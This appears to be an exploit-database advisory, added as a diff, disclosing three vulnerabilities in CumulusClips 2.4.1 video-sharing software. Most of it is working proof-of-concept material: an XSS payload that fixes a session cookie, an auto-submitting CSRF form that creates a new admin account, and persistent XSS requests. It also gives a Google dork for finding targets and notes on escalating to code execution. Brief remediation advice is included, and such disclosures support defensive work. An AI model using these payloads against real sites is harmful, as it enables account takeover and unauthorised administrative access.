@@ -1,0 +1,156 @@
+# Exploit Title: CumulusClips Session fixation
+# Google Dork: inurl:/cumulusclips/videos/
+# Date: 2.09.2016
+# Exploit Author: kor3k / Łukasz Korczyk
+# Vendor Homepage: http://cumulusclips.org/
+# Software Link: http://cumulusclips.org/cumulusclips.zip
+# Version: 2.4.1
+# Tested on: Debian Jessie
+
+
+Description:
+CumulusClips is a video sharing script that allows you to start your own
+video website.
+CumulusClips video sharing script produces HTML5 video compatible on iOS &
+Android mobile devices, as well as all the major browsers.
+
+
+PoC:
+
+POST /cumulusclips/account/videos/edit/1362/ HTTP/1.1
+Host: 192.168.122.203
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.122.203/cumulusclips/account/videos/edit/1362/
+Cookie: PHPSESSID=bqaok1gfcs0s7hqfc40g2bsbr1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 211
+
+title=evilcartoon%3Cscript%3Edocument.cookie%3D%27PHPSESSID%
+3Dxxxxxxxxxxxxxxxxxxxxxxxxxx%3Bpath%3D%2F%3B%27%3C%
+2Fscript%3E&tags=aaa&cat_id=1&description=aaa&private_url=
+BOZtzZX&submitted=TRUE&button=Update+Video
+
+Remediation:
+Change session id after sucessful login
+
+Post exploitation:
+Since it is posible to impersonate admin there is possibility for a code
+execution and unrestricted file upload in admin panel.
+
+#######################################################
+
+# Exploit Title: CumulusClips XSRF and code execution
+# Google Dork: inurl:/cumulusclips/videos/
+# Date: 2.09.2016
+# Exploit Author: kor3k / Łukasz Korczyk 
+# Vendor Homepage: http://cumulusclips.org/
+# Software Link: http://cumulusclips.org/cumulusclips.zip
+# Version: 2.4.1
+# Tested on: Debian Jessie
+# CVE : [if applicable]
+
+Description:
+CumulusClips is a video sharing script that allows you to start your own video website. 
+CumulusClips video sharing script produces HTML5 video compatible on iOS & Android mobile devices, as well as all the major browsers.
+
+
+PoC:
+<html>
+  <body>
+    <form action="http://192.168.122.203/cumulusclips/cc-admin/members_add.php" method="POST">
+      <input type="hidden" name="role" value="admin" />
+      <input type="hidden" name="email" value="admin&#64;mailinator&#46;com" />
+      <input type="hidden" name="username" value="newadmin" />
+      <input type="hidden" name="password" value="newadminpass" />
+      <input type="hidden" name="password&#45;show" value="" />
+      <input type="hidden" name="first&#95;name" value="" />
+      <input type="hidden" name="last&#95;name" value="" />
+      <input type="hidden" name="website" value="" />
+      <input type="hidden" name="about&#95;me" value="" />
+      <input type="hidden" name="submitted" value="TRUE" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+Remediation:
+Use anti-csrf token, fix all XSS'es
+
+#######################################################
+
+
+# Exploit Title: CumulusClips Persistent XSS
+# Google Dork: inurl:/cumulusclips/videos/
+# Date: 2.09.2016
+# Exploit Author: kor3k / Łukasz Korczyk 
+# Vendor Homepage: http://cumulusclips.org/
+# Software Link: http://cumulusclips.org/cumulusclips.zip
+# Version: 2.4.1
+# Tested on: Debian Jessie
+# CVE : [if applicable]
+
+Description:
+CumulusClips is a video sharing script that allows you to start your own video website. 
+CumulusClips video sharing script produces HTML5 video compatible on iOS & Android mobile devices, as well as all the major browsers.
+
+Any registered user may inject a code to main site. There is no HTTPonly flag on cookies so it is possible to steal session information. 
+
+PoC:
+
+locations:
+/cumulusclips/account/videos/edit/
+/cumulusclips/account/upload/video/
+
+
+
+
+POST /cumulusclips/account/videos/edit/1358/ HTTP/1.1
+Host: 192.168.122.203
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.122.203/cumulusclips/account/videos/edit/1358/
+Cookie: PHPSESSID=etia0ncfb00m0ma1834cf1dds5
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 215
+
+title=www%3Cscript%3Ealert%281%29%3C%2Fscript%3E&tags=www%3Cscript%3Ealert%281%29%3C%2Fscript%3E&cat_id=1&description=www%3Cscript%3Ealert%281%29%3C%2Fscript%3E&private_url=DyZbn8m&submitted=TRUE&button=Update+Video
+
+reflected on main site:
+
+GET /cumulusclips/ HTTP/1.1
+Host: 192.168.122.203
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.122.203/
+Connection: close
+
+RESPONSE:
+...
+div class="video">
+    <div class="thumbnail">
+        <a href="http://192.168.122.203/cumulusclips/videos/1358/www-script-alert-1-script/" title="www<script>alert(1)</script>">
+            <img width="165" height="92" src="http://192.168.122.203/cumulusclips/cc-content/uploads/thumbs/Ufi5q2RKsQtXwludfZnR.jpg" />
+...
+
+
+Post exploitation:
+Since it is posible to steal the cookie and impersonate admin there is possibility for a code execution and unrestricted file upload in admin panel. 
+
+Remediation:
+Validate user input for special characters (preferable white list), use HTTPonly header
